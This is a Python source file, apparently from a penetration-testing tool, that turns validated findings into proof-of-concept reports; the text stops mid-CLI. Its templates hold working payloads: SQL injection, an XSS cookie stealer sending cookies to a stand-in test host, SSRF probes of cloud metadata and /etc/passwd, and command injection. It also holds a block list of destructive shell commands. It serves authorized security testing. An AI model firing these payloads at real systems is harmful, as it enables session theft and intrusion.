#!/usr/bin/env python3
"""Proof-of-Concept Generator for the GKN-Phantom Penetration Testing Skill.

Generates professional, safe, detection-only PoCs for every validated finding
across all 42 vulnerability types. Outputs multiple formats suitable for
reporting, CI integration, manual verification, and tool import.

Capabilities:
  - Multi-Format PoC Export — curl commands, standalone Python scripts,
    HAR 1.2 archives, Markdown reproduction steps, raw HTTP/1.1 text.
  - Vulnerability-Specific Templates — tailored PoCs for each vuln type
    (SQLi, XSS, SSRF, IDOR, RCE, and all others).
  - Safe PoC Validation — all generated PoCs are DETECTION-ONLY:
    no destructive operations, no data exfiltration, time-based payloads
    capped at 5s, safety level markers (SAFE/CAUTION/DANGEROUS).
  - Batch Generation — process all validated findings from a single
    findings.json in one run.
  - PoC Index — generate a standalone HTML index page with severity
    badges, type labels, and links to individual PoCs.
  - Template Variables — {{TARGET}}, {{PARAM}}, {{PAYLOAD}}, {{COOKIE}},
    {{TIMESTAMP}} and more for flexible PoC customization.

Usage:
  python poc_generator.py --finding finding.json --format curl,python,har [--output ./poc]
  python poc_generator.py --findings findings.json --format all --output-dir ./pocs/
"""

from __future__ import annotations

import argparse
import base64
import html
import json
import os
import re
import sys
import textwrap
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from utils import load_json, dump_json, utc_now_iso, finding_fingerprint


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

SAFETY_LEVELS = ["SAFE", "CAUTION", "DANGEROUS"]

# Vulnerability types → safety classification
# DANGEROUS: could cause harm even with detection-only payloads
# CAUTION: payload has side effects (time delays, error states)
# SAFE: purely passive or informational
VULN_SAFETY: dict[str, str] = {
    # SAFE — passive detection, no side effects
    "info_leak": "SAFE",
    "open_redirect": "SAFE",
    "csrf": "SAFE",
    "misconfig": "SAFE",
    "graphql_introspection": "SAFE",
    "directory_listing": "SAFE",
    "component_exposure": "SAFE",
    "captcha_bypass": "SAFE",
    "cors_misconfig": "SAFE",
    "subdomain_takeover": "SAFE",
    "websocket_hijacking": "SAFE",
    "session_fixation": "SAFE",
    "oauth_misconfig": "SAFE",
    "dependency_confusion": "SAFE",
    "weak_credential": "SAFE",
    # CAUTION — payloads have minor side effects
    "xss": "CAUTION",
    "path_traversal": "CAUTION",
    "xxe": "CAUTION",
    "ssti": "CAUTION",
    "deserialization": "CAUTION",
    "command_injection": "CAUTION",
    "sqli": "CAUTION",
    "ssrf": "CAUTION",
    "idor": "CAUTION",
    "file_upload": "CAUTION",
    "logic_flaw": "CAUTION",
    "nosql_injection": "CAUTION",
    "ldap_injection": "CAUTION",
    "graphql_injection": "CAUTION",
    "crlf_injection": "CAUTION",
    "host_header_injection": "CAUTION",
    "email_injection": "CAUTION",
    "cache_poisoning": "CAUTION",
    "race_condition": "CAUTION",
    "prototype_pollution": "CAUTION",
    "jwt_deep_analysis": "CAUTION",
    "mass_assignment": "CAUTION",
    # DANGEROUS — could cause significant impact even during detection
    "rce": "DANGEROUS",
    "auth_bypass": "DANGEROUS",
    "priv_esc": "DANGEROUS",
    "data_exposure": "DANGEROUS",
    "http_smuggling": "DANGEROUS",
}

# Severity → badge color (for HTML index)
SEVERITY_COLORS = {
    "critical": "#dc3545",
    "high": "#fd7e14",
    "medium": "#ffc107",
    "low": "#28a745",
}

SAFETY_COLORS = {
    "SAFE": "#28a745",
    "CAUTION": "#ffc107",
    "DANGEROUS": "#dc3545",
}

# Template variable patterns
VAR_PATTERN = re.compile(r"\{\{(\w+)\}\}")

# Dangerous SQL keywords that must never appear in PoCs
FORBIDDEN_SQL = re.compile(
    r"\b(DROP|TRUNCATE|DELETE\s+FROM|ALTER\s+TABLE|UPDATE\s+\w+\s+SET|"
    r"INSERT\s+INTO|CREATE\s+TABLE|EXEC\s*\(|SHUTDOWN)\b",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Template variable substitution
# ---------------------------------------------------------------------------

def _resolve(value: str, variables: dict) -> str:
    """Replace {{VAR}} placeholders in value using the variables dict.

    Returns the original value unchanged if it is not a string.
    """
    if not isinstance(value, str):
        return value

    def _replacer(m: re.Match) -> str:
        key = m.group(1)
        return str(variables.get(key, m.group(0)))
    return VAR_PATTERN.sub(_replacer, value)


def _build_variables(finding: dict) -> dict:
    """Build the standard template variable dict from a finding."""
    evidence = finding.get("evidence", {}) or {}
    return {
        "TARGET": finding.get("target", "https://target.example.com"),
        "PARAM": finding.get("param", finding.get("parameter", "id")),
        "PAYLOAD": finding.get("payload", finding.get("detection_payload", "")),
        "COOKIE": (evidence.get("request", "") or ""),
        "TIMESTAMP": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "FINGERPRINT": finding.get("fingerprint", finding_fingerprint(finding)),
        "SEVERITY": finding.get("severity", "low"),
        "TYPE": finding.get("type", "unknown"),
        "ID": finding.get("id", "FINDING-000"),
        "METHOD": finding.get("method", "GET"),
        "PATH": finding.get("path", "/"),
        "RESPONSE_SNIPPET": (evidence.get("response", "") or "")[:200],
        "TOOL": evidence.get("tool", "httpRequest"),
    }


# ---------------------------------------------------------------------------
# Safety validation
# ---------------------------------------------------------------------------

def _validate_safety(poc_text: str, vuln_type: str) -> dict:
    """Check a generated PoC for dangerous patterns.

    Returns {"safe": bool, "warnings": [str], "blocked_patterns": [str]}.
    """
    warnings: list[str] = []
    blocked: list[str] = []

    # Check for forbidden SQL keywords
    sql_matches = FORBIDDEN_SQL.findall(poc_text)
    if sql_matches:
        blocked.extend(sql_matches)
        warnings.append(f"Blocked destructive SQL patterns: {', '.join(sql_matches)}")

    # Check for dangerous command patterns
    dangerous_cmds = [
        (r"\brm\s+-rf\b", "rm -rf (destructive)"),
        (r"\bdd\s+if=", "dd (disk overwrite)"),
        (r"\bmkfs\.", "mkfs (format)"),
        (r"\bwget\s.*\|\s*(ba)?sh\b", "wget piped to shell"),
        (r"\bcurl\s.*\|\s*(ba)?sh\b", "curl piped to shell"),
        (r">\/dev\/sd[a-z]", "write to block device"),
    ]
    for pattern, desc in dangerous_cmds:
        if re.search(pattern, poc_text, re.IGNORECASE):
            blocked.append(desc)
            warnings.append(f"Blocked dangerous command: {desc}")

    # Check time-based payloads
    time_patterns = re.findall(r"(?:sleep|timeout|delay)\s*[\(:]\s*(\d+)", poc_text, re.IGNORECASE)
    for val in time_patterns:
        try:
            if int(val) > 5:
                warnings.append(f"Time-based payload exceeds 5s cap: {val}s")
        except ValueError:
            pass

    return {
        "safe": len(blocked) == 0,
        "warnings": warnings,
        "blocked_patterns": blocked,
    }


# ---------------------------------------------------------------------------
# PoC format generators
# ---------------------------------------------------------------------------

def _generate_curl(finding: dict) -> str:
    """Generate a complete curl command reproducing the finding."""
    v = _build_variables(finding)
    evidence = finding.get("evidence", {}) or {}
    method = v["METHOD"].upper()
    target = v["TARGET"]
    path = v["PATH"]
    full_url = target.rstrip("/") + "/" + path.lstrip("/") if path else target

    parts = ["curl", "-X", method]

    # Parse request text for headers
    req_text = evidence.get("request", "")
    headers = _parse_headers_from_request(req_text)

    for hdr_name, hdr_value in headers.items():
        # Skip host header (curl adds it)
        if hdr_name.lower() == "host":
            continue
        parts.append(f"-H '{hdr_name}: {hdr_value}'")

    # Body
    body = _parse_body_from_request(req_text)
    if body and method in ("POST", "PUT", "PATCH"):
        parts.append(f"-d '{body}'")

    parts.append(f"'{full_url}'")

    return " \\\n  ".join(parts)


def _generate_python_script(finding: dict) -> str:
    """Generate a standalone Python requests-based PoC script."""
    v = _build_variables(finding)
    evidence = finding.get("evidence", {}) or {}
    method = v["METHOD"]
    target = v["TARGET"]
    path = v["PATH"]
    full_url = target.rstrip("/") + "/" + path.lstrip("/") if path else target
    fingerprint = v["FINGERPRINT"]
    safety = VULN_SAFETY.get(v["TYPE"], "CAUTION")

    req_text = evidence.get("request", "")
    headers = _parse_headers_from_request(req_text)
    body = _parse_body_from_request(req_text)
    cookies_str = evidence.get("cookies", "")

    lines = [
        "#!/usr/bin/env python3",
        '"""GKN-Phantom Detection PoC — SAFE / NO DATA DESTRUCTION',
        "",
        f"Vulnerability: {v['TYPE']}",
        f"Severity:      {v['SEVERITY']}",
        f"Safety Level:  {safety}",
        f"Target:        {full_url}",
        f"Fingerprint:   {fingerprint}",
        "",
        "THIS SCRIPT IS DETECTION-ONLY. It does not exfiltrate data,",
        "modify records, or perform destructive actions.",
        '"""',
        "",
        "import sys",
        "import requests",
        "import urllib3",
        "",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)",
        "",
        f"TARGET = {json.dumps(full_url)}",
        f"METHOD = {json.dumps(method)}",
        f"HEADERS = {json.dumps(headers, indent=4)}",
    ]

    if body:
        lines.append(f"BODY = {json.dumps(body)}")
    else:
        lines.append("BODY = None")

    if cookies_str:
        lines.append(f"COOKIES = {json.dumps(cookies_str)}")
    else:
        lines.append("COOKIES = None")

    lines.extend([
        "",
        "",
        "def main():",
        "    print(f'[*] GKN-Phantom PoC: {v[\"TYPE\"]} @ {TARGET}')",
        "    print(f'[*] Safety level: {safety}')",
        "    ",
        "    try:",
        "        if METHOD.upper() == 'GET':",
        "            resp = requests.get(TARGET, headers=HEADERS, cookies=COOKIES,",
        "                               verify=False, timeout=15, allow_redirects=False)",
        "        elif METHOD.upper() == 'POST':",
        "            resp = requests.post(TARGET, headers=HEADERS, data=BODY,",
        "                                cookies=COOKIES, verify=False, timeout=15,",
        "                                allow_redirects=False)",
        "        elif METHOD.upper() == 'PUT':",
        "            resp = requests.put(TARGET, headers=HEADERS, data=BODY,",
        "                               cookies=COOKIES, verify=False, timeout=15,",
        "                               allow_redirects=False)",
        "        else:",
        "            resp = requests.request(METHOD, TARGET, headers=HEADERS,",
        "                                   data=BODY, cookies=COOKIES,",
        "                                   verify=False, timeout=15,",
        "                                   allow_redirects=False)",
        "    except requests.exceptions.RequestException as e:",
        "        print(f'[!] Request failed: {e}')",
        "        return 1",
        "    ",
        "    print(f'[*] Status: {resp.status_code}')",
        "    print(f'[*] Content-Length: {len(resp.text)}')",
        "    print(f'[*] Response preview (first 500 chars):')",
        "    print(resp.text[:500])",
        "    ",
        "    # Detection signal check (customize per finding)",
        f"    detection_signal = {json.dumps(evidence.get('response', '')[:120])}",
        "    if detection_signal and detection_signal in resp.text:",
        "        print('[+] DETECTION SIGNAL MATCHED — vulnerability confirmed.')",
        "        return 0",
        "    else:",
        "        print('[-] Detection signal not found in response.')",
        "        return 1",
        "",
        "",
        "if __name__ == '__main__':",
        "    sys.exit(main())",
    ])

    return "\n".join(lines)


def _generate_har(finding: dict) -> dict:
    """Generate a HAR 1.2 archive entry for the finding."""
    v = _build_variables(finding)
    evidence = finding.get("evidence", {}) or {}
    method = v["METHOD"]
    target = v["TARGET"]
    path = v["PATH"]
    full_url = target.rstrip("/") + "/" + path.lstrip("/") if path else target
    parsed = urllib.parse.urlparse(full_url)
    req_text = evidence.get("request", "")
    headers = _parse_headers_from_request(req_text)
    body = _parse_body_from_request(req_text)

    har_headers = [
        {"name": k, "value": v} for k, v in headers.items()
    ]

    entry = {
        "startedDateTime": v["TIMESTAMP"],
        "time": 0,
        "request": {
            "method": method.upper(),
            "url": full_url,
            "httpVersion": "HTTP/1.1",
            "cookies": [],
            "headers": har_headers,
            "queryString": [
                {"name": k, "value": ",".join(v) if isinstance(v, list) else str(v)}
                for k, v in urllib.parse.parse_qs(parsed.query).items()
            ],
            "postData": {
                "mimeType": headers.get("Content-Type", "application/x-www-form-urlencoded"),
                "text": body or "",
            } if body else {},
            "headersSize": -1,
            "bodySize": -1,
        },
        "response": {
            "status": 0,
            "statusText": "",
            "httpVersion": "HTTP/1.1",
            "cookies": [],
            "headers": [],
            "content": {
                "size": 0,
                "mimeType": "text/html",
                "text": evidence.get("response", "")[:2000],
            },
            "redirectURL": "",
            "headersSize": -1,
            "bodySize": -1,
        },
        "cache": {},
        "timings": {
            "send": 0,
            "wait": 0,
            "receive": 0,
        },
        "_gkn_phantom": {
            "finding_type": v["TYPE"],
            "severity": v["SEVERITY"],
            "fingerprint": v["FINGERPRINT"],
            "safety_level": VULN_SAFETY.get(v["TYPE"], "CAUTION"),
        },
    }
    return entry


def _generate_markdown(finding: dict) -> str:
    """Generate a Markdown reproduction snippet for report inclusion."""
    v = _build_variables(finding)
    safety = VULN_SAFETY.get(v["TYPE"], "CAUTION")
    curl_cmd = _generate_curl(finding)

    lines = [
        f"### {v['TYPE'].upper().replace('_', ' ')} — {v['ID']}",
        "",
        f"| Field | Value |",
        f"|-------|-------|",
        f"| **Type** | `{v['TYPE']}` |",
        f"| **Severity** | `{v['SEVERITY']}` |",
        f"| **Target** | `{v['TARGET']}` |",
        f"| **Parameter** | `{v['PARAM']}` |",
        f"| **Safety Level** | `{safety}` |",
        f"| **Fingerprint** | `{v['FINGERPRINT']}` |",
        "",
        "#### Reproduction Steps",
        "",
        f"1. Navigate to `{v['TARGET']}{v['PATH']}`",
        f"2. Inject the detection payload in the `{v['PARAM']}` parameter",
        f"3. Observe the response for the detection signal",
        "",
        "#### Curl PoC",
        "",
        "```bash",
        curl_cmd,
        "```",
        "",
        "#### Detection Signal",
        "",
        "```",
        v["RESPONSE_SNIPPET"],
        "```",
        "",
        "#### Notes",
        "",
        f"- This PoC is **{safety}**. It performs detection only.",
        "- No data is modified, deleted, or exfiltrated.",
        "- Generated by GKN-Phantom v3.0 on {v['TIMESTAMP']}",
        "",
        "---",
        "",
    ]
    return "\n".join(lines)


def _generate_raw_http(finding: dict) -> str:
    """Generate raw HTTP/1.1 request text."""
    evidence = finding.get("evidence", {}) or {}
    req_text = evidence.get("request", "")
    if req_text:
        return req_text

    # Reconstruct from finding fields
    v = _build_variables(finding)
    method = v["METHOD"].upper()
    path = v["PATH"] or "/"
    target = v["TARGET"]
    parsed = urllib.parse.urlparse(target)
    host = parsed.netloc or "target.example.com"

    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]

    headers = _parse_headers_from_request(req_text)
    for hdr_name, hdr_value in headers.items():
        if hdr_name.lower() == "host":
            continue
        lines.append(f"{hdr_name}: {hdr_value}")

    body = _parse_body_from_request(req_text)
    if body:
        lines.append(f"Content-Length: {len(body.encode('utf-8'))}")
        lines.append("")
        lines.append(body)
    else:
        lines.append("")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Vulnerability-specific template generators
# ---------------------------------------------------------------------------

def _template_sqli(finding: dict) -> dict:
    """SQL Injection PoC with UNION SELECT proof and time-based demo."""
    v = _build_variables(finding)
    payload = v["PAYLOAD"] or "' OR '1'='1"
    target = v["TARGET"]
    param = v["PARAM"]

    time_payload = f"{param}=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- "
    union_payload = f"{param}=1' UNION SELECT NULL,NULL,NULL-- "
    error_payload = f"{param}=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- "

    return {
        "type": "sqli",
        "proofs": {
            "union_select": {
                "description": "UNION SELECT proof — appends attacker-controlled rows to the result set.",
                "payload": union_payload,
                "curl": _render_curl_poc(target, "GET", {param: union_payload}),
                "note": "The number of NULL columns should be adjusted to match the original query.",
            },
            "error_based": {
                "description": "Error-based trigger — extracts DBMS version via error messages.",
                "payload": error_payload,
                "curl": _render_curl_poc(target, "GET", {param: error_payload}),
                "note": "Response should contain database error with version string.",
            },
            "time_based": {
                "description": "Time-based blind demonstration — 5-second delay confirms SQL execution.",
                "payload": time_payload,
                "curl": _render_curl_poc(target, "GET", {param: time_payload}),
                "note": "Response time should be >= 5 seconds. SAFETY CAP: max 5s.",
            },
        },
    }


def _template_xss(finding: dict) -> dict:
    """XSS PoC with alert() and safe cookie stealer demo."""
    v = _build_variables(finding)
    target = v["TARGET"]
    param = v["PARAM"]

    alert_payload = f"{param}=<script>alert('GKN-Phantom-XSS-{v['FINGERPRINT'][:6]}')</script>"
    cookie_stealer = (
        f"{param}=<img src=x onerror=\""
        f"var i=new Image();i.src='https://oob.authorized.test/steal?c='+document.cookie"
        f"\">"
    )

    return {
        "type": "xss",
        "proofs": {
            "alert_poc": {
                "description": "Standard alert() proof — triggers JavaScript dialog on page load.",
                "payload": alert_payload,
                "curl": _render_curl_poc(target, "GET", {param: alert_payload}),
                "note": "Safe demonstration. Shows that arbitrary JavaScript executes.",
            },
            "cookie_stealer_demo": {
                "description": "Cookie stealer demonstration (safe — sends to authorized test sink).",
                "payload": cookie_stealer,
                "curl": _render_curl_poc(target, "GET", {param: cookie_stealer}),
                "note": (
                    "SAFE: exfiltrates ONLY to the authorized OOB test sink "
                    "(oob.authorized.test). No real data leaves the test environment."
                ),
            },
        },
    }


def _template_ssrf(finding: dict) -> dict:
    """SSRF PoC with internal service probing commands."""
    v = _build_variables(finding)
    target = v["TARGET"]
    param = v["PARAM"]

    return {
        "type": "ssrf",
        "proofs": {
            "internal_http": {
                "description": "Probe internal HTTP service via SSRF.",
                "payload": f"{param}=http://169.254.169.254/latest/meta-data/",
                "curl": _render_curl_poc(target, "GET", {param: "http://169.254.169.254/latest/meta-data/"}),
                "note": "AWS metadata endpoint. Cloud environments may return instance metadata.",
            },
            "internal_port_scan": {
                "description": "Internal port scanning via SSRF — detect open services.",
                "payload": f"{param}=http://127.0.0.1:22",
                "curl": _render_curl_poc(target, "GET", {param: "http://127.0.0.1:22"}),
                "note": "Responses may differ for open vs closed ports (timing/text).",
            },
            "file_protocol": {
                "description": "File protocol SSRF — attempt to read local files.",
                "payload": f"{param}=file:///etc/passwd",
                "curl": _render_curl_poc(target, "GET", {param: "file:///etc/passwd"}),
                "note": "DETECTION ONLY. Checks if file:// scheme is accepted.",
            },
        },
    }


def _template_idor(finding: dict) -> dict:
    """IDOR PoC with cross-user data access demonstration."""
    v = _build_variables(finding)
    target = v["TARGET"]
    path = v["PATH"]

    return {
        "type": "idor",
        "proofs": {
            "sequential_id": {
                "description": "Increment/decrement resource ID to access other users' data.",
                "payload": f"Increment/Decrement the ID parameter in {path}",
                "curl": _render_curl_poc(target.replace("ID_PLACEHOLDER", "ID+1"), "GET", {}),
                "note": "Replace ID_PLACEHOLDER with the actual ID found. Test ID+1 and ID-1.",
            },
            "uuid_manipulation": {
                "description": "Replace UUID with another known user's UUID to test authorization.",
                "payload": "Replace UUID in path with another user's UUID",
                "curl": _render_curl_poc(target, "GET", {}),
                "note": "DETECTION ONLY. Verify that authorization checks are enforced.",
            },
        },
    }


def _template_rce(finding: dict) -> dict:
    """RCE PoC — DANGEROUS tier, detection only."""
    v = _build_variables(finding)
    target = v["TARGET"]
    param = v["PARAM"]
    fp = v["FINGERPRINT"][:6]

    return {
        "type": "rce",
        "proofs": {
            "dns_oob": {
                "description": "Out-of-band DNS callback proof — safest RCE detection method.",
                "payload": f"{param}=; nslookup {fp}.oob.authorized.test;",
                "curl": _render_curl_poc(target, "GET", {param: f"; nslookup {fp}.oob.authorized.test;"}),
                "note": "SAFE: uses authorized OOB DNS sink. No file writes or command execution on target.",
            },
            "echo_test": {
                "description": "Echo test — print unique marker to confirm command execution.",
                "payload": f"{param}=; echo GKN-PHANTOM-{fp};",
                "curl": _render_curl_poc(target, "GET", {param: f"; echo GKN-PHANTOM-{fp};"}),
                "note": "SAFE: echo only. Response should contain the unique marker string.",
            },
            "id_command": {
                "description": "Run 'id' to show current user context (detection only).",
                "payload": f"{param}=; id;",
                "curl": _render_curl_poc(target, "GET", {param: "; id;"}),
                "note": "SAFE: read-only command. Shows uid/gid of the web process.",
            },
        },
    }


def _template_generic(finding: dict) -> dict:
    """Generic PoC template for any vulnerability type."""
    v = _build_variables(finding)
    return {
        "type": v["TYPE"],
        "proofs": {
            "detection": {
                "description": f"Detection proof for {v['TYPE']}",
                "payload": v["PAYLOAD"] or "(see finding evidence)",
                "curl": _generate_curl(finding),
                "note": "This is a generic detection PoC. Review the finding evidence for details.",
            },
        },
    }


# VULN_TEMPLATES maps each vuln type to its specialized template generator
VULN_TEMPLATES: dict[str, Any] = {
    "sqli": _template_sqli,
    "xss": _template_xss,
    "ssrf": _template_ssrf,
    "idor": _template_idor,
    "rce": _template_rce,
    # All other types fall back to _template_generic
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _parse_headers_from_request(req_text: str) -> dict[str, str]:
    """Parse HTTP headers from raw request text."""
    headers: dict[str, str] = {}
    if not req_text:
        return headers
    # If it's already JSON-encoded headers
    if req_text.strip().startswith("{"):
        try:
            return dict(json.loads(req_text))
        except (json.JSONDecodeError, TypeError):
            pass
    # Parse raw HTTP request
    lines = req_text.split("\n")
    for line in lines[1:]:  # skip request line
        line = line.strip()
        if not line:
            break
        if ":" in line:
            key, _, value = line.partition(":")
            headers[key.strip()] = value.strip()
    return headers


def _parse_body_from_request(req_text: str) -> str:
    """Extract body from raw HTTP request text."""
    if not req_text:
        return ""
    # Find double-newline that separates headers from body
    parts = req_text.split("\n\n", 1)
    if len(parts) > 1:
        return parts[1].strip()
    parts = req_text.split("\r\n\r\n", 1)
    if len(parts) > 1:
        return parts[1].strip()
    return ""


def _render_curl_poc(target: str, method: str, params: dict) -> str:
    """Build a simple curl command from target, method, and query params."""
    parts = ["curl", "-X", method.upper()]
    if params:
        query = urllib.parse.urlencode(params)
        if "?" in target:
            full = f"{target}&{query}"
        else:
            full = f"{target}?{query}"
    else:
        full = target
    parts.append(f"'{full}'")
    return " \\\n  ".join(parts)


# ---------------------------------------------------------------------------
# PoC generation orchestration
# ---------------------------------------------------------------------------

def generate_poc(
    finding: dict,
    formats: list[str],
    output_dir: str = ".",
) -> dict:
    """Generate PoC artifacts for a single finding.

    Args:
        finding: A validated finding dict (status=validated).
        formats: List of format names: curl, python, har, markdown, raw_http, all.
        output_dir: Directory to write output files.

    Returns:
        Dict mapping format → output file path, plus safety validation results.
    """
    if "all" in formats:
        formats = ["curl", "python", "har", "markdown", "raw_http"]

    v = _build_variables(finding)
    vuln_type = finding.get("type", "unknown")
    safety_level = VULN_SAFETY.get(vuln_type, "CAUTION")
    fingerprint = v["FINGERPRINT"]

    os.makedirs(output_dir, exist_ok=True)
    outputs: dict[str, str] = {}
    safety_results: dict[str, dict] = {}

    # Generate vulnerability-specific template
    template_fn = VULN_TEMPLATES.get(vuln_type, _template_generic)
    vuln_template = template_fn(finding)

    # ---- curl ----
    if "curl" in formats:
        curl_text = _generate_curl(finding)
        safety = _validate_safety(curl_text, vuln_type)
        safety_results["curl"] = safety
        fname = f"{fingerprint}.sh"
        fpath = os.path.join(output_dir, fname)
        with open(fpath, "w", encoding="utf-8") as f:
            f.write("#!/bin/bash\n# GKN-Phantom PoC — ")
            f.write(f"{vuln_type} | {safety_level}\n")
            f.write(f"# Target: {v['TARGET']}\n")
            f.write(f"# Fingerprint: {fingerprint}\n\n")
            f.write(curl_text)
            f.write("\n")
        outputs["curl"] = fpath

    # ---- python ----
    if "python" in formats:
        py_text = _generate_python_script(finding)
        safety = _validate_safety(py_text, vuln_type)
        safety_results["python"] = safety
        fname = f"{fingerprint}.py"
        fpath = os.path.join(output_dir, fname)
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(py_text)
        outputs["python"] = fpath

    # ---- har ----
    if "har" in formats:
        har_entry = _generate_har(finding)
        har_text = json.dumps(har_entry, indent=2, ensure_ascii=False)
        safety = _validate_safety(har_text, vuln_type)
        safety_results["har"] = safety
        fname = f"{fingerprint}.har.json"
        fpath = os.path.join(output_dir, fname)
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(har_text)
        outputs["har"] = fpath

    # ---- markdown ----
    if "markdown" in formats:
        md_text = _generate_markdown(finding)
        safety = _validate_safety(md_text, vuln_type)
        safety_results["markdown"] = safety
        fname = f"{fingerprint}.md"
        fpath = os.path.join(output_dir, fname)
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(md_text)
        outputs["markdown"] = fpath

    # ---- raw_http ----
    if "raw_http" in formats:
        raw_text = _generate_raw_http(finding)
        safety = _validate_safety(raw_text, vuln_type)
        safety_results["raw_http"] = safety
        fname = f"{fingerprint}.http.txt"
        fpath = os.path.join(output_dir, fname)
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(raw_text)
        outputs["raw_http"] = fpath

    return {
        "finding_id": finding.get("id", ""),
        "fingerprint": fingerprint,
        "type": vuln_type,
        "severity": v["SEVERITY"],
        "safety_level": safety_level,
        "template": vuln_template,
        "outputs": outputs,
        "safety_checks": safety_results,
    }


def generate_poc_batch(
    findings: list[dict],
    formats: list[str],
    output_dir: str = "./pocs",
) -> dict:
    """Generate PoCs for all validated findings in a batch.

    Args:
        findings: List of finding dicts (only validated ones are processed).
        formats: List of format names.
        output_dir: Root directory for PoC output.

    Returns:
        Dict with summary stats and per-finding results.
    """
    validated = [f for f in findings if f.get("status") == "validated"]
    if not validated:
        print("[*] No validated findings to generate PoCs for.")
        return {"total": 0, "generated": 0, "results": [], "output_dir": output_dir}

    os.makedirs(output_dir, exist_ok=True)
    results: list[dict] = []
    safety_summary = {"SAFE": 0, "CAUTION": 0, "DANGEROUS": 0}

    for finding in validated:
        finding_dir = os.path.join(output_dir, finding_fingerprint(finding))
        result = generate_poc(finding, formats, finding_dir)
        results.append(result)
        sl = result.get("safety_level", "CAUTION")
        if sl in safety_summary:
            safety_summary[sl] += 1

        # Check for safety violations
        for fmt_name, check in result.get("safety_checks", {}).items():
            if not check.get("safe", True):
                print(f"  [!] SAFETY WARNING [{finding.get('type')}/{fmt_name}]:")
                for w in check.get("warnings", []):
                    print(f"      - {w}")

    # Generate index
    index_path = _generate_poc_index(results, output_dir)
    print(f"\n[+] PoC index: {index_path}")

    return {
        "total": len(findings),
        "validated": len(validated),
        "generated": len(results),
        "output_dir": output_dir,
        "index": index_path,
        "safety_summary": safety_summary,
        "results": results,
    }


# ---------------------------------------------------------------------------
# PoC Index HTML generator
# ---------------------------------------------------------------------------

def _generate_poc_index(results: list[dict], output_dir: str) -> str:
    """Generate an index HTML page listing all generated PoCs."""
    rows_html: list[str] = []
    for r in results:
        fp = r["fingerprint"]
        vuln_type = r["type"]
        severity = r["severity"]
        safety = r["safety_level"]
        sev_color = SEVERITY_COLORS.get(severity, "#6c757d")
        safety_color = SAFETY_COLORS.get(safety, "#ffc107")
        outputs = r.get("outputs", {})

        links_html = " ".join(
            f'<a href="{fp}/{os.path.basename(path)}" class="poc-link">{fmt}</a>'
            for fmt, path in outputs.items()
        )

        rows_html.append(f"""
        <tr>
            <td><code>{fp}</code></td>
            <td><span class="badge" style="background:{sev_color}">{severity.upper()}</span></td>
            <td><span class="badge" style="background:{safety_color}">{safety}</span></td>
            <td>{vuln_type.replace('_', ' ').title()}</td>
            <td>{links_html}</td>
        </tr>""")

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GKN-Phantom PoC Index</title>
<style>
  body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0d1117; color: #c9d1d9; margin: 0; padding: 2rem; }}
  h1 {{ color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 0.5rem; }}
  table {{ width: 100%; border-collapse: collapse; margin-top: 1rem; }}
  th, td {{ padding: 0.75rem; text-align: left; border-bottom: 1px solid #30363d; }}
  th {{ background: #161b22; color: #8b949e; font-weight: 600; }}
  tr:hover {{ background: #1c2128; }}
  code {{ background: #161b22; padding: 0.15em 0.4em; border-radius: 3px; font-size: 0.85em; }}
  .badge {{ display: inline-block; padding: 0.2em 0.6em; border-radius: 4px; color: #fff; font-size: 0.75em; font-weight: 600; text-transform: uppercase; }}
  .poc-link {{ display: inline-block; margin-right: 0.5em; padding: 0.15em 0.5em; background: #238636; color: #fff; border-radius: 3px; text-decoration: none; font-size: 0.8em; }}
  .poc-link:hover {{ background: #2ea043; }}
  .summary {{ background: #161b22; padding: 1rem; border-radius: 6px; margin-bottom: 1.5rem; }}
  .summary span {{ margin-right: 1.5rem; }}
  .footer {{ margin-top: 2rem; color: #8b949e; font-size: 0.85em; border-top: 1px solid #30363d; padding-top: 1rem; }}
</style>
</head>
<body>
<h1>GKN-Phantom v3.0 — Proof-of-Concept Index</h1>

<div class="summary">
  <span>Generated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}</span>
  <span>Total PoCs: {len(results)}</span>
</div>

<table>
<thead>
  <tr>
    <th>Fingerprint</th>
    <th>Severity</th>
    <th>Safety</th>
    <th>Type</th>
    <th>PoC Files</th>
  </tr>
</thead>
<tbody>
  {''.join(rows_html)}
</tbody>
</table>

<div class="footer">
  GKN-Phantom v3.0 — Detection-only PoCs. All payloads are non-destructive.
  Generated for authorized penetration testing purposes only.
</div>
</body>
</html>"""

    index_path = os.path.join(output_dir, "index.html")
    with open(index_path, "w", encoding="utf-8") as f:
        f.write(html_content)
    return index_path


# ---------------------------------------------------------------------------
# Single-finding convenience
# ---------------------------------------------------------------------------

def generate_single_finding(
    finding_path: str,
    formats: list[str],
    output: str = "./poc",
) -> dict:
    """Load a single finding JSON and generate its PoC."""
    finding = load_json(finding_path)
    output_dir = os.path.dirname(output) if output else "."
    base = os.path.splitext(os.path.basename(output))[0]
    if not output_dir or output_dir == ".":
        output_dir = f"./poc_{base}"

    result = generate_poc(finding, formats, output_dir)
    print(f"[+] PoC generated for {finding.get('type', 'unknown')} "
          f"({finding.get('severity', 'low')})")
    for fmt, path in result.get("outputs", {}).items():
        print(f"    {fmt}: {path}")
    return result


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="GKN-Phantom PoC Generator — professional proof-of-concept export",
    )
    p.add_argument(
        "--finding",
